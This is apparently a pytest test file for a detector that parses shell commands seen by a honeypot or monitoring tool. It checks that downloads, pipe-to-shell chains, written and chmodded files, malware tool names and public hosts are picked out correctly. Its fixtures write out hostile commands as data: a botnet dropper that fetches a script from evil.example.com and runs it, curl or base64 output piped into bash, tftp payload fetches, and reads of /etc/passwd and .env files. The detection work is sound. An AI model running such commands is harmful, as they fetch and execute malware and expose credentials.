import pytest

from brain.commands import (
    command_name,
    domains,
    downloaded_files,
    executed_files,
    is_download,
    pipes_to_shell,
    public_host,
    segments,
    tool_names,
    written_files,
    chmodded_executable,
    urls,
)

BOT_LINE = "cd /tmp || cd /var/run; wget http://evil.example.com/bins.sh; chmod 777 bins.sh; sh bins.sh"


def test_segments():
    assert segments("a; b && c || d | e\nf") == ["a", "b", "c", "d", "e", "f"]
    assert segments("") == []


def test_command_name_skips_wrappers():
    assert command_name("sudo FOO=1 /usr/bin/wget x") == "wget"
    assert command_name("/bin/busybox tftp -g") == "tftp"
    assert command_name("./xmrig -o pool") == "./xmrig"


def test_urls_and_domains():
    assert urls(BOT_LINE) == ["http://evil.example.com/bins.sh"]
    assert domains(BOT_LINE) == ["evil.example.com"]
    assert domains("wget 45.9.1.2/x86") == ["45.9.1.2"]
    assert domains("cat notes.txt") == []
    assert domains("wget config.sh") == []


def test_is_download():
    assert is_download(BOT_LINE)
    assert is_download("curl -fsSL https://x.io/i.sh | bash")
    assert is_download("tftp -g -r mips 1.2.3.4")
    assert is_download("scp user@host:/f .")
    assert not is_download("curl --version")
    assert not is_download("cat wget.log")


def test_downloaded_and_executed_files():
    assert downloaded_files(BOT_LINE) == ["bins.sh"]
    # -O names the saved file; the url's own name is never created
    assert downloaded_files("wget -O /tmp/.x http://a.b/c") == [".x"]
    assert executed_files(BOT_LINE) == ["bins.sh"]
    assert executed_files("./xmrig -o x; /tmp/kd") == ["xmrig", "kd"]
    assert executed_files("bash -i") == []


def test_pipes_to_shell():
    assert pipes_to_shell("curl x | sh")
    assert pipes_to_shell("echo aGk= | base64 -d | bash")
    assert not pipes_to_shell("ls | grep sh")


def test_tool_names():
    assert "xmrig" in tool_names("./xmrig --donate-level 1")
    assert "kinsing" in tool_names("wget http://a.b/kinsing")
    assert tool_names("ls -la; cat /etc/passwd; uname -a") == []


def test_written_files():
    assert written_files("echo -ne '\x7fELF' > /tmp/.d") == ["/tmp/.d"]
    assert written_files("printf 'a' >> .x") == [".x"]
    assert written_files("echo f0VMRgI= | base64 -d > /tmp/k") == ["/tmp/k"]
    assert written_files("echo 'a > b' | tee -a run.sh /tmp/two") == ["run.sh", "/tmp/two"]
    assert written_files("cat > \"/tmp/s p\" << EOF") == ["/tmp/s p"]
    # not writes: other commands, stderr, /dev, base64 encoding
    assert written_files("uname -a > /dev/null 2> err.log") == []
    assert written_files("ls > files.txt") == []
    assert written_files("echo hi | base64 > enc.txt") == []
    assert written_files("echo 'x > y'") == []


def test_chmodded_executable():
    assert chmodded_executable("chmod +x /tmp/.d") == [".d"]
    assert chmodded_executable("chmod 755 a b; chmod u+x c") == ["a", "b", "c"]
    assert chmodded_executable("chmod 644 a; chmod -x b; chmod +r c") == []


def test_tool_names_only_programs_run_or_downloaded():
    # named but never run as a program
    assert tool_names("cat log | kinsing_parser; grep xmrig /tmp/log") == []
    assert tool_names("chmod +x mirai.arm7") == ["mirai.arm7"]
    assert tool_names("curl -o /tmp/kdevtmpfsi http://a.b/x") == ["kdevtmpfsi"]


@pytest.mark.parametrize("line", [
    "wget http://a.b/filter; chmod +x filter; ./filter",  # english word
    "./update.sh", "sh install.sh", "bash setup",  # english words
    "./source", "sh export", "./alias",  # shell builtins
    "./netstat", "chmod +x /tmp/crontab", "./busybox",  # standard commands
    "./x86", "sh a.sh", "./kd",  # under 4 characters
])
def test_tool_names_skip_generic_names(line):
    assert tool_names(line) == []


# demo_agent's command 8 from the live run: two local curls that save nothing
AGENT_CMD8 = ("echo \"=== web / ===\"; curl -s -m5 -H 'Host: shop.quillfern.lan' http://127.0.0.1/health; echo; "
              "curl -s -m5 -o /dev/null -w '%{http_code}\\n' http://127.0.0.1/; echo \"=== sudo ===\"; "
              "sudo -n -l 2>&1 | head; echo \"=== .env perms ===\"; ls -l /opt/app/.env; cat /opt/app/.env 2>&1 | head")


def test_agent_command_8_has_nothing_to_look_up():
    assert downloaded_files(AGENT_CMD8) == []
    assert tool_names(AGENT_CMD8) == []
    assert [h for h in domains(AGENT_CMD8) if public_host(h)] == []


@pytest.mark.parametrize("host", [
    "127.0.0.1", "127.8.9.10", "10.1.2.3", "172.16.0.1", "172.31.255.255", "192.168.1.1",
    "169.254.169.254", "::1", "[::1]", "::ffff:127.0.0.1", "fe80::1", "0.0.0.0", "203.0.113.9",
    "localhost", "qf-web-01", "dl.bot-sim.invalid", "printer.local", "shop.quillfern.lan",
    "x.test", "box.localhost", "nas.home.arpa", "1.2.3",
])
def test_private_and_reserved_hosts_are_never_searched(host):
    assert not public_host(host)


@pytest.mark.parametrize("host", ["45.9.1.2", "172.32.0.1", "2606:4700::1111", "evil.example.com", "c3pool.com"])
def test_public_hosts_are_searched(host):
    assert public_host(host)


@pytest.mark.parametrize("line,saved", [
    # curl only saves with -o, -O or a redirect
    ("curl http://a.b/kinsing", []),
    ("curl -s http://45.9.1.2/health", []),
    ("curl -O http://a.b/kinsing", ["kinsing"]),
    ("curl -fsSLO http://a.b/kinsing", ["kinsing"]),
    ("curl --remote-name http://a.b/kinsing", ["kinsing"]),
    ("curl -sSLo /tmp/kd2 http://a.b/x", ["kd2"]),
    ("curl --output=/tmp/kdevtmpfsi http://a.b/x", ["kdevtmpfsi"]),
    ("curl -s http://a.b/kinsing > /tmp/kinsing", ["kinsing"]),
    ("curl -o /dev/null http://a.b/kinsing", []),
    ("curl -s -o - http://a.b/kinsing | sh", []),
    # wget saves under the url name unless -O says otherwise
    ("wget http://a.b/kinsing", ["kinsing"]),
    ("wget -q -o wget.log http://a.b/kinsing", ["kinsing"]),
    ("wget -qO- http://a.b/kinsing | sh", []),
    ("wget -O - http://a.b/kinsing", []),
    ("wget -O /dev/null http://a.b/kinsing", []),
    ("wget --output-document=/tmp/k http://a.b/kinsing", ["k"]),
    ("wget -qO- http://a.b/kinsing > /tmp/k", ["k"]),
    ("tftp -g -r mips 1.2.3.4", ["mips"]),
])
def test_only_saved_downloads_count(line, saved):
    assert downloaded_files(line) == saved


def test_endpoint_words_are_never_tool_names():
    line = "; ".join(f"wget http://a.b/{w}" for w in ("health", "null", "index.html", "status", "healthz", "robots.txt"))
    assert tool_names(line) == []


def test_a_pipe_inside_quotes_is_not_a_shell_pipe():
    assert not pipes_to_shell("grep -E 'bash|sh$' /etc/passwd")
    assert not pipes_to_shell('awk -F: "/sh$|bash/" /etc/passwd')
    # a shell -c script still counts
    assert pipes_to_shell("bash -c 'curl http://a.b/i | sh'")
